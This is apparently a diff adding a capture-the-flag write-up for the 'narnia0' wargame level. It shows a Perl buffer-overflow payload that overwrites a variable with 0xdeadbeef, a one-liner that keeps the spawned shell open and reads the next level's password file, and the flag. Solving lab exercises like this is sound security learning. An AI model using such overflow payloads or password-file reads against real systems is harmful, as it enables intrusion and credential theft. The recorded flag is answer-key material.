@@ -1,0 +1,23 @@
+
+long val=0x41414141;
+char buf[20];
+
+if(val==0xdeadbeef){ //win condition
+
+=> overflow buf to write 0xdeadbeef in val
+
+NOTES:
+
+payload: perl -e 'print "B"x20,pack("I",0xdeadbeef)'
+use (payload;cat) to keep invoked shell opened
+use echo "cmd" at the beginning to exec command in opened shell
+
+SOLUTION:
+
+echo "cat /etc/narnia_pass/narnia1" | (perl -e 'print "B"x20,pack("I",0xdeadbeef)';cat)  | ./narnia0
+
+FLAG:
+
+efeidiedae
+	
+	
